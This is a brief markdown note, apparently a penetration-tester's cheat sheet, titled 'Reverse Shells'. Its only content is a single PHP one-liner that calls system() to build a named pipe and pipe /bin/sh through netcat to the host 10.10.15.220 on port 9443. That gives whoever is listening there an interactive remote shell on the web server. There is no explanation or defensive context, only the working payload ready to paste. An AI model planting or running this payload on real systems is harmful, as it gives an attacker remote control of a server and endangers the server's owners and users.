# Reverse Shells  

## PHP  

PHP with bash system command.  

`<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.220 9443 >/tmp/f"); ?>`
